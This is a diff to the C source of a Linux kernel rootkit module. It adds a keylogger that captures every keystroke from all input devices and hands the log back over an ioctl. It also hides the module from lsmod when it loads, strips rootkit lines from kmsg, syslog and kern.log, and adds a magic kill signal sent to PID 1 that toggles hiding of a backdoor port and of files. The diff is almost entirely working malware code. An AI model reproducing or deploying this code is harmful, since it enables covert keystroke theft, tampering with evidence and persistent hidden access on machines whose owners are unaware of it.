@@ -53,11 +53,148 @@ char rk_msg[RK_MSG_MAX];
 static char backdoor_password[BACKDOOR_PASS_MAX] = "";
 static struct task_struct *backdoor_thread = NULL;
 
+/* === Module list hiding === */
+static struct list_head *saved_module_list = NULL;
+static bool module_hidden = false;
+
+/* === Keylogger === */
+static char keylog_buf[KEYLOG_BUF_MAX];
+static int keylog_pos = 0;
+static bool keylog_enabled = false;
+static DEFINE_SPINLOCK(keylog_lock);
+
+/* === Kill signal hook === */
+static struct ftrace_hook kill_hook;
+typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
+static orig_kill_t orig_kill;
+
+/* === Rootkit active state (toggled via magic signal) === */
+static bool rk_active = true;
+
+/* Scancode to ASCII mapping (US QWERTY, lowercase only) */
+static const char *scancode_to_key[] = {
+    [1] = "[ESC]", [2] = "1", [3] = "2", [4] = "3", [5] = "4",
+    [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9",
+    [11] = "0", [12] = "-", [13] = "=", [14] = "[BKSP]",
+    [15] = "[TAB]", [16] = "q", [17] = "w", [18] = "e", [19] = "r",
+    [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o",
+    [25] = "p", [26] = "[", [27] = "]", [28] = "[ENT]",
+    [29] = "[CTRL]", [30] = "a", [31] = "s", [32] = "d", [33] = "f",
+    [34] = "g", [35] = "h", [36] = "j", [37] = "k", [38] = "l",
+    [39] = ";", [40] = "'", [41] = "`", [42] = "[LSHFT]", [43] = "\\",
+    [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b",
+    [49] = "n", [50] = "m", [51] = ",", [52] = ".", [53] = "/",
+    [54] = "[RSHFT]", [55] = "*", [56] = "[ALT]", [57] = " ",
+};
+
+
+/* ============================================================
+ * Feature 1: Module list hiding — hide from lsmod/kobject
+ * ============================================================ */
+static void hide_module(void)
+{
+    if (module_hidden)
+        return;
+    saved_module_list = THIS_MODULE->list.prev;
+    list_del_init(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    module_hidden = true;
+    pr_info("rootkit: module hidden from lsmod\n");
+}
+
+static void show_module(void)
+{
+    if (!module_hidden)
+        return;
+    list_add(&THIS_MODULE->list, saved_module_list);
+    module_hidden = false;
+    pr_info("rootkit: module visible again in lsmod\n");
+}
+
+/* ============================================================
+ * Feature 3: Keylogger — input subsystem handler
+ * ============================================================ */
+static void keylog_event(struct input_handle *handle, unsigned int type,
+                         unsigned int code, int value)
+{
+    unsigned long flags;
+    const char *key;
+    size_t len;
+
+    if (!keylog_enabled || !rk_active)
+        return;
+    if (type != EV_KEY || value != 1) /* only key-down */
+        return;
+    if (code >= ARRAY_SIZE(scancode_to_key) || !scancode_to_key[code])
+        return;
+
+    key = scancode_to_key[code];
+    len = strlen(key);
+
+    spin_lock_irqsave(&keylog_lock, flags);
+    if (keylog_pos + len < KEYLOG_BUF_MAX - 1) {
+        memcpy(keylog_buf + keylog_pos, key, len);
+        keylog_pos += len;
+        keylog_buf[keylog_pos] = '\0';
+    }
+    spin_unlock_irqrestore(&keylog_lock, flags);
+}
+
+static int keylog_connect(struct input_handler *handler,
+                          struct input_dev *dev,
+                          const struct input_device_id *id)
+{
+    struct input_handle *handle;
+    int ret;
+
+    handle = kzalloc(sizeof(*handle), GFP_KERNEL);
+    if (!handle)
+        return -ENOMEM;
+
+    handle->dev = dev;
+    handle->handler = handler;
+    handle->name = "rk_keylog";
+
+    ret = input_register_handle(handle);
+    if (ret) {
+        kfree(handle);
+        return ret;
+    }
+
+    ret = input_open_device(handle);
+    if (ret) {
+        input_unregister_handle(handle);
+        kfree(handle);
+        return ret;
+    }
+
+    return 0;
+}
+
+static void keylog_disconnect(struct input_handle *handle)
+{
+    input_close_device(handle);
+    input_unregister_handle(handle);
+    kfree(handle);
+}
+
+static const struct input_device_id keylog_ids[] = {
+    { .driver_info = 1 },  /* matches all input devices */
+    { },
+};
+
+static struct input_handler keylog_handler = {
+    .event      = keylog_event,
+    .connect    = keylog_connect,
+    .disconnect = keylog_disconnect,
+    .name       = "rk_keylog",
+    .id_table   = keylog_ids,
+};
 
 /**
- * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall, 
- * copies directory entries into kernel buffer, 
- * removes entries matching a module/script name or a hidden PID under /proc, 
+ * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall,
+ * copies directory entries into kernel buffer,
+ * removes entries matching a module/script name or a hidden PID under /proc,
  * then writes back filtered results to user space and returns the new entry count
  *
  * @param regs The `regs` parameter in the `new_getdents64` function is a pointer to a structure of
@@ -82,6 +219,9 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
     char *endptr = NULL;
 
     ret = orig_getdents64(regs);
+
+    if (!rk_active)
+        return ret;
     
     if (ret <= 0) {
         return ret;
@@ -182,6 +322,9 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     if (IS_ERR(path_fd)) {
         return orig_read(regs);
     }
+
+    if (!rk_active)
+        return orig_read(regs);
 
     if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
         uid_t uid = current_uid().val;
@@ -284,17 +427,77 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         kfree(kbuf);
     }
 
+    /* Feature 2: Filter rootkit entries from dmesg / syslog */
+    if (strstr(path_fd, "kmsg") != NULL ||
+        strcmp(path_fd, "/var/log/syslog") == 0 ||
+        strcmp(path_fd, "/var/log/kern.log") == 0) {
+        char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
+        if (!kbuf)
+            return ret;
+
+        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
+            kfree(kbuf);
+            return ret;
+        }
+        kbuf[ret] = '\0';
+
+        /* Remove any line containing "rootkit" */
+        char *line = kbuf;
+        char *dst = kbuf;
+        while (*line) {
+            char *eol = strchr(line, '\n');
+            size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);
+
+            if (!strnstr(line, "rootkit", line_len)) {
+                if (dst != line)
+                    memmove(dst, line, line_len);
+                dst += line_len;
+            }
+            line += line_len;
+        }
+        *dst = '\0';
+        ret = dst - kbuf;
+
+        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
+            kfree(kbuf);
+            return -EFAULT;
+        }
+        kfree(kbuf);
+    }
+
     return ret;
 };
 
 static int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    if (v != SEQ_START_TOKEN) {
+    if (rk_active && v != SEQ_START_TOKEN) {
         struct sock *sk = v;
         if (sk->sk_num == (unsigned short)backdoor_port)
             return 0;
     }
     return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
+}
+
+/* ============================================================
+ * Feature 4: Magic kill signal — toggle rootkit on/off
+ * Sending signal 63 to PID 1 toggles all hiding features.
+ * ============================================================ */
+static asmlinkage long new_kill(const struct pt_regs *regs)
+{
+    int sig = (int)regs->si;
+    pid_t pid = (pid_t)regs->di;
+
+    if (sig == RK_MAGIC_SIGNAL && pid == 1) {
+        rk_active = !rk_active;
+        pr_info("rootkit: toggled %s via magic signal\n",
+                rk_active ? "ON" : "OFF");
+        if (rk_active && !module_hidden)
+            hide_module();
+        else if (!rk_active && module_hidden)
+            show_module();
+        return 0; /* swallow the signal */
+    }
+    return orig_kill(regs);
 }
 
 
@@ -424,6 +627,56 @@ static int install_tcp_hook(kallsyms_lookup_name_t lookup)
     return 0;
 }
 
+static int install_kill_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    kill_hook.name = "__x64_sys_kill";
+    kill_hook.function = new_kill;
+    kill_hook.original = &orig_kill;
+
+    kill_hook.address = lookup(kill_hook.name);
+    if (!kill_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_kill\n");
+        return -ENOENT;
+    }
+
+    pr_info("[+] __x64_sys_kill @ 0x%lx\n", kill_hook.address);
+    orig_kill = (orig_kill_t)kill_hook.address;
+
+    kill_hook.ops.func = hook_callback;
+    kill_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 0, 0);
+    if (ret) {
+        pr_err("[-] ftrace_set_filter_ip (kill): %d\n", ret);
+        return ret;
+    }
+
+    ret = register_ftrace_function(&kill_hook.ops);
+    if (ret) {
+        pr_err("[-] register_ftrace_function (kill): %d\n", ret);
+        ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 1, 0);
+        return ret;
+    }
+
+    return 0;
+}
+
+static void uninstall_kill_hook(void)
+{
+    if (kill_hook.ops.func != NULL) {
+        int ret = unregister_ftrace_function(&kill_hook.ops);
+        if (ret)
+            pr_err("rootkit: failed to unregister ftrace function (kill) (%d)\n", ret);
+    }
+    if (kill_hook.address != 0) {
+        int ret = ftrace_set_filter_ip(&kill_hook.ops, kill_hook.address, 1, 0);
+        if (ret)
+            pr_err("rootkit: failed to clear ftrace filter (kill) (%d)\n", ret);
+    }
+}
+
 /**
  * The function `install_hook` sets up a hook for the `__x64_sys_getdents64` system call using kprobes
  * and ftrace in the Linux kernel.
@@ -499,6 +752,7 @@ static int install_hook(void)
 
     install_read_hook(lookup);
     install_tcp_hook(lookup);
+    install_kill_hook(lookup);
     return 0;
 }
 
@@ -635,7 +889,7 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
+    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
     if (ret < 0)
         goto out;
 
@@ -822,6 +1076,42 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
     break;
 
+    case RK_CMD_HIDE_MODULE:
+        hide_module();
+        break;
+
+    case RK_CMD_SHOW_MODULE:
+        show_module();
+        break;
+
+    case RK_CMD_TOGGLE_KEYLOG:
+        keylog_enabled = !keylog_enabled;
+        printk(KERN_INFO "rootkit: keylogger %s\n",
+               keylog_enabled ? "enabled" : "disabled");
+        break;
+
+    case RK_CMD_GET_KEYLOG: {
+        unsigned long flags;
+        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
+            return -EFAULT;
+
+        spin_lock_irqsave(&keylog_lock, flags);
+        if (keylog_pos > 0) {
+            size_t to_copy = keylog_pos;
+            if (to_copy > RK_MSG_MAX - 1)
+                to_copy = RK_MSG_MAX - 1;
+            if (copy_to_user((char __user *)args.target,
+                             keylog_buf, to_copy)) {
+                spin_unlock_irqrestore(&keylog_lock, flags);
+                return -EFAULT;
+            }
+            /* flush buffer after read */
+            keylog_pos = 0;
+            keylog_buf[0] = '\0';
+        }
+        spin_unlock_irqrestore(&keylog_lock, flags);
+        break;
+    }
 
     default:
         return -ENOTTY;
@@ -919,10 +1209,17 @@ static int __init rootkit_init(void)
     ret = install_hook();
 
     if (ret) {
-        printk(KERN_ERR "[-] Erreur installation hook TCP\n");
+        printk(KERN_ERR "[-] Erreur installation hooks\n");
         misc_deregister(&rk_misc);
         return -ENOENT;
     }
+
+    ret = input_register_handler(&keylog_handler);
+    if (ret)
+        pr_warn("rootkit: keylogger handler registration failed (%d)\n", ret);
+
+    /* Auto-hide module on load */
+    hide_module();
 
     printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
         rk_misc.minor);
@@ -935,6 +1232,11 @@ static int __init rootkit_init(void)
  */
 static void __exit rootkit_exit(void)
 {
+    /* Restore module visibility so rmmod works cleanly */
+    show_module();
+
+    input_unregister_handler(&keylog_handler);
+
     misc_deregister(&rk_misc);
     if (getdents_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&getdents_hook.ops);
@@ -952,10 +1254,9 @@ static void __exit rootkit_exit(void)
     }
 
     uninstall_read_hook();
-    
     uninstall_tcp_hook();
-    
-    
+    uninstall_kill_hook();
+
     synchronize_rcu();
     close_backdoor_port();
     printk(KERN_INFO "rootkit: unloaded\n");
